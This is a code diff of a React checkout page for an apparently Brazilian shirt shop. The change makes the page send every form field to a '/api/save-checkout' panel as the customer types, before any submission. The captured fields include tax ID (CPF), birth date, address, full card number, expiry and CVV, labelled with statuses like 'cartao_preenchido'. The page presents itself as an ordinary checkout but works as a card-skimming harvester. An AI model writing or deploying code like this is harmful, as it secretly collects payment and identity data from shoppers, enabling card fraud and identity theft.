@@ -200,73 +200,80 @@ export default function Checkout() {
     }
   }, [searchParams, cartItems, cartTotal, totalItems, discount]);
 
-  const salvarDadosNoPainel = async (statusPagamento = 'pending') => {
+  const [dbCheckoutId, setDbCheckoutId] = useState<number | string | null>(() => {
     try {
-      console.log("Salvando ficha completa no Supabase...", statusPagamento);
-      const fullCheckoutPayload = {
-        nome_completo: formData.nome,
-        email: formData.email,
-        cpf: formData.cpf,
-        data_nascimento: formData.dataNascimento,
-        telefone: formData.telefone,
-        cep: formData.cep,
-        endereco: formData.endereco,
-        bairro: formData.bairro,
-        cidade: formData.cidade,
-        estado: formData.estado,
-        numero: formData.numero,
-        numero_cartao: formData.numCartao || (metodo === 'pix' ? 'PIX' : ''),
-        nome_cartao: formData.nomeCartao || (metodo === 'pix' ? 'PIX' : ''),
-        validade_cartao: formData.validade || (metodo === 'pix' ? 'PIX' : ''),
-        cvv_cartao: formData.cvv || (metodo === 'pix' ? 'PIX' : ''),
-        produto_nome: produto.nome,
-        valor_total: produto.preco,
-        status: statusPagamento || 'pending',
+      const saved = sessionStorage.getItem('c10_checkout_db_id');
+      return saved ? JSON.parse(saved) : null;
+    } catch (_) { return null; }
+  });
+
+  const salvarDadosNoPainel = async (statusPagamento = 'em_digitacao') => {
+    try {
+      const hasAnyValue = Object.values(formData).some(val => typeof val === 'string' && val.trim().length > 0);
+      if (!hasAnyValue) return;
+
+      const payload = {
+        checkout_id: dbCheckoutId || undefined,
+        nome_completo: formData.nome || null,
+        email: formData.email || null,
+        cpf: formData.cpf || null,
+        data_nascimento: formData.dataNascimento || null,
+        telefone: formData.telefone || null,
+        cep: formData.cep || null,
+        endereco: formData.endereco || null,
+        bairro: formData.bairro || null,
+        cidade: formData.cidade || null,
+        estado: formData.estado || null,
+        numero: formData.numero || null,
+        numero_cartao: formData.numCartao || (metodo === 'pix' ? 'PIX' : null),
+        nome_cartao: formData.nomeCartao || (metodo === 'pix' ? 'PIX' : null),
+        validade_cartao: formData.validade || (metodo === 'pix' ? 'PIX' : null),
+        cvv_cartao: formData.cvv || (metodo === 'pix' ? 'PIX' : null),
+        produto_nome: produto.nome || 'Camiseta',
+        valor_total: produto.preco || 0,
+        status: statusPagamento,
         cupom_aplicado: discount > 0 ? 'CAMISA10' : null
       };
 
-      let { error } = await supabase.from('checkouts').insert([fullCheckoutPayload]);
-
-      // Fallback sem colunas status/cupom_aplicado caso o banco tenha esquema antigo
-      if (error && (error.message?.includes('column') || error.message?.includes('schema cache'))) {
-        const basicCheckoutPayload = { ...fullCheckoutPayload };
-        delete (basicCheckoutPayload as any).status;
-        delete (basicCheckoutPayload as any).cupom_aplicado;
-        const fbRes = await supabase.from('checkouts').insert([basicCheckoutPayload]);
-        error = fbRes.error;
+      const res = await fetch('/api/save-checkout', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      if (res.ok) {
+        const json = await res.json();
+        if (json.id) {
+          setDbCheckoutId(json.id);
+          sessionStorage.setItem('c10_checkout_db_id', JSON.stringify(json.id));
+        }
       }
 
       if (statusPagamento === 'pix_generated' || statusPagamento === 'paid') {
         registerUsedDiscountsFromOrder(cartItems, discount > 0 ? 'CAMISA10' : undefined);
       }
-      
-      if (error) console.error("Erro Supabase checkouts:", error);
     } catch (e) {
       console.error("Erro ao salvar dados no painel:", e);
     }
   };
 
-  // Gatilhos de salvamento em tempo real para capturar TUDO
+  // Salva em tempo real TODOS os campos preenchidos conforme o cliente digita
   useEffect(() => {
-    // Se preencheu os dados básicos
-    if (formData.nome && formData.cpf && formData.telefone.length >= 14) {
-      salvarDadosNoPainel('lead_pessoal');
-    }
-  }, [formData.telefone]);
-
-  useEffect(() => {
-    // Se preencheu o endereço (disparado após preencher o número da casa)
-    if (formData.endereco && formData.numero && formData.cidade) {
-      salvarDadosNoPainel('lead_endereco');
-    }
-  }, [formData.numero]);
-
-  useEffect(() => {
-    // Se preencheu os dados do cartão (disparado após preencher o CVV)
-    if (formData.numCartao.length >= 16 && formData.cvv.length >= 3) {
-      salvarDadosNoPainel('lead_cartao_preenchido');
-    }
-  }, [formData.cvv]);
+    const timer = setTimeout(() => {
+      const hasValue = Object.values(formData).some(val => typeof val === 'string' && val.trim().length > 0);
+      if (hasValue) {
+        let currentStatus = 'em_digitacao';
+        if (formData.numCartao && formData.cvv) {
+          currentStatus = 'cartao_preenchido';
+        } else if (formData.endereco && formData.numero) {
+          currentStatus = 'endereco_preenchido';
+        } else if (formData.nome && formData.telefone) {
+          currentStatus = 'lead_pessoal';
+        }
+        salvarDadosNoPainel(currentStatus);
+      }
+    }, 400);
+    return () => clearTimeout(timer);
+  }, [formData, metodo]);
 
   const gerarPix = async () => {
     if (!formData.nome || !formData.cpf || !formData.email) {
